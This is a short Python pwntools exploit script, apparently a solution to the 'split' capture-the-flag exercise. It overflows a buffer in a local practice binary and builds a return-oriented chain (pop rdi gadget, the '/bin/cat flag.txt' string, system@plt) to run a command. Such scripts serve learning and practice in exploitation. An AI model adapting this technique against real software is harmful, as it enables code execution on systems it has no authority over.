#!/usr/bin/python

from pwn import *

s = process('./split')
s.clean()

# gdb-peda$ p &usefulString
# $2 = (<data variable, no debug info> *) 0x601060 <usefulString>
# gdb-peda$ x/s 0x601060
# 0x601060 <usefulString>:	"/bin/cat flag.txt"

bin_cat = 0x601060

# 0x0000000000400883 : pop rdi ; ret
pop_rdi_ret = 0x400883

# 0x00000000004005e0  system@plt
system = 0x4005e0

payload = 'A' * 40
payload += p64(pop_rdi_ret)
payload += p64(bin_cat)
payload += p64(system)

s.sendline(payload)

s.interactive()



